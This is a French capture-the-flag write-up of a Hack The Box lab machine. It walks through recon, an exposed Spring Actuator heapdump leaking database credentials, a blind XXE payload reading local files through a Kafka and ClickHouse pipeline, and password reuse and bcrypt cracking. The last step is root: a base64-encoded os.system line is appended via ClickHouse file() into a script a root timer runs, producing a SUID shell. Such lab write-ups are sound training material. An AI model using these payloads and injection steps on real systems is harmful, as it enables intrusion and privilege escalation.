  # Stream

	echo "10.129.125.56 htb-airport.htb api.htb-airport.htb db.htb-airport.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.125.56 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.125.56 -oN nmap.txt

Scans classiques.

	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
	80/tcp   open  http    nginx 1.24.0 (Ubuntu)
	|_http-title: Did not follow redirect to http://api.htb-airport.htb/
	8081/tcp open  http    Uvicorn

Fuzzing de sous-domaines :

	ffuf -u http://htb-airport.htb -H "Host: FUZZ.htb-airport.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 6

	api                     [Status: 200]
	db                      [Status: 200]

- db.htb-airport.htb : interface HTTP ClickHouse qui demande des credentials
- api.htb-airport.htb : "terminal-edge-gateway" (Spring Boot).     

Fuzzing :

	ffuf -u http://api.htb-airport.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt

	actuator                [Status: 200]
	actuator/heapdump       [Status: 200, ~58 MB]

Endpoint Actuator exposé, heapdump JVM complet téléchargeable (Java HPROF) :

	curl http://api.htb-airport.htb/actuator/heapdump -o heapdump
	file heapdump

Voir JDumpSpider pour faire un peu mieux qu'un grep : https://github.com/whwlsfb/JDumpSpider
```
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
...
curl 'http://db.htb-airport.htb/?user=svc_events&password=$PASSWORD' --data-binary 'SHOW GRANTS'
```

> GRANT SELECT, INSERT ON partner_feed.* TO svc_events

	curl -s "http://db.htb-airport.htb/?user=svc_events&password=$PASSWORD" --data-binary 'SHOW TABLES FROM partner_feed'

	flightleg_json, flightleg_json_kafka, flightleg_json_mv
	flightleg_raw, flightleg_raw_kafka, flightleg_raw_mv

Les moteurs de table (Kafka / MaterializedView) révèlent le pipeline : ingestion HTTP, XML brut dans un topic Kafka aidx.flightleg.raw.v1, transformeur qui parse du XML en JSON vers aidx.flightleg.json.v1, puis flightleg_json (lisible par nous). On contrôle l'entrée XML et on lit la sortie parsée donc canal tout trouvé pour une XXE blind.

	curl -s http://htb-airport.htb:8081 | jq

> "note": "Ingest does not parse. Full validation happens downstream."

Le parseur en aval (lxml, résolution d'entités activée) est la vraie surface XXE :

	cat xxe.xml

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
	    <!ENTITY xxe SYSTEM "file:///etc/passwd">
	]>
	<IATA_AIDX_FlightLegNotifRQ>
	    <Originator>test</Originator>
	    <FlightLeg>
	        <LegIdentifier>
	            <FlightNumber>&xxe;</FlightNumber>
	        </LegIdentifier>
	    </FlightLeg>
	</IATA_AIDX_FlightLegNotifRQ>

	curl -si http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @xxe.xml

202 Accepted, blind. Résultat via ClickHouse :

	curl -sS "http://db.htb-airport.htb/?user=svc_events&password=$PASSWORD" --data-binary "SELECT JSONExtractString(event, 'leg', 'ufi', 'flight_number') FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical"

/etc/passwd ressort dans flight_number. Deux comptes locaux : svc-infra (uid 1000), martin_cole (uid 1001).

Pivot sur file:///etc/systemd/system/kafka.service : Kafka tourne en svc-infra, conf réelle dans /opt/kafka_2.13-4.3.1/config/server.properties. Relu pareil :

> listener.name.sasl_plaintext.plain.sasl.jaas.config=...PlainLoginModule required user_svc_infra="$PASSWORD";

Réutilisé comme mot de passe OS :

	ssh svc-infra@10.129.125.56

Le listener Kafka non-authentifié (9092) ne montre que les topics déjà connus. Conf SASL pour le listener authentifié (9094) :

	cat > /tmp/kafka_sasl.properties << 'EOF'
	security.protocol=SASL_PLAINTEXT
	sasl.mechanism=PLAIN
	sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="svc_infra" password="$PASSWORD";
	EOF

	/opt/kafka_2.13-4.3.1/bin/kafka-topics.sh --bootstrap-server localhost:9094 --command-config /tmp/kafka_sasl.properties --list

Topic caché : aidx.identity.json.v1.

	/opt/kafka_2.13-4.3.1/bin/kafka-console-consumer.sh --bootstrap-server localhost:9094 --command-config /tmp/kafka_sasl.properties --topic aidx.identity.json.v1 --partition 0 --offset 0 --max-messages 5

> {"username":"martin_cole", ... "password":"<HASH_BCRYPT>","algo":"bcrypt", ...}

	john hash --wordlist=/usr/share/wordlists/rockyou.txt
	su - martin_cole
	cat user.txt

## Élévation de privilèges

martin_cole a un dossier backups/ (repository Kopia avec session déjà configurée) :

	kopia snapshot list
	kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs-restore
	cat /tmp/ch-logs-restore/clickhouse-server.err.log

Requête SQL mal échappée qui a loggé son propre contenu en clair, mot de passe de default (ClickHouse, admin complet) récupéré.

Recherche classique des timers/services qui tournent en root :

	systemctl list-timers --all
	cat /etc/systemd/system/aidx-dlq-drainer.timer

Un timer tourne toutes les 2 minutes. Son service associé pointe vers un script :

	systemctl cat aidx-dlq-drainer.service
	cat /opt/ops/dlq_drainer.py

Ce script root draine une Dead Letter Queue Kafka et lance pour chaque message :

	subprocess.run(["python3", "/var/lib/clickhouse/user_files/aidx_quarantine.py"], input=raw, ...)

/var/lib/clickhouse/user_files/ est le dossier sandbox exposé par ClickHouse via sa fonction de table file().        
default a le grant FILE et écrit donc dedans via SQL.       
aidx_quarantine.py est un script Python simple, et "INSERT INTO FUNCTION file(...)" ajoute à un fichier existant plutôt que de l'écraser, une ligne ajoutée après if __name__ == "__main__": main() s'exécute juste après.     

	CMD='cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
	B64=$(echo -n "$CMD" | base64 -w0)

	curl -sS "http://db.htb-airport.htb/?user=default&password=$PASSWORD" --data-binary "INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 's String') VALUES ('import os,base64;os.system(base64.b64decode(\"$B64\").decode())')"

Message dans la DLQ pour déclencher le drainer :

	echo "<IATA_AIDX_FlightLegNotifRQ>test</IATA_AIDX_FlightLegNotifRQ>" | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server localhost:9092 --topic aidx.flightleg.dlq.v1

Attendre le prochain tick (< 2 minutes) :

	ls -la /tmp/rootbash
	# -rwsr-xr-x 1 root root ... /tmp/rootbash

	/tmp/rootbash -p
	cat /root/root.txt
